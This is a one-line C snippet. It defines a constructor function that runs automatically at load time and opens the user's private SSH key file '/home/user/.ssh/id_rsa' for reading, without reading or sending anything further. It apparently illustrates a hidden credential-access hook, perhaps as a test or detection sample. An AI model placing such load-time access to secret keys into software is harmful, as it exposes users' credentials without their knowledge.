__attribute__((constructor)) static void f(void) { fopen("/home/user/.ssh/id_rsa", "r"); }
